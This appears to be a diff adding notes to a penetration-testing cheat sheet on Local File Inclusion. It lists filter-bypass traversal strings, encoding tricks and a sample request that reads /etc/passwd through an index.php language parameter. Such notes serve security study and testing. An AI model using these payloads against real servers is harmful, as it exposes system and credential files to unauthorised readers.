@@ -1,5 +1,22 @@
 ## Local File Inclusion
 
+## Non-Recursive Path Traversal Filters 
+* ....//
+* ..././ or ....\/
+* ....\/
+* ....////
+
+## Encoding
+* URL encode ../ into %2e%2e%2f
+* double encoded
+## Approved Paths
+* <SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd
+  
+## Path Truncation
+  * ////etc/passwd
+  * /etc/./passwd
+  
+
 | **Command** | **Description** |
 | --------------|-------------------|
 | **Basic LFI** |
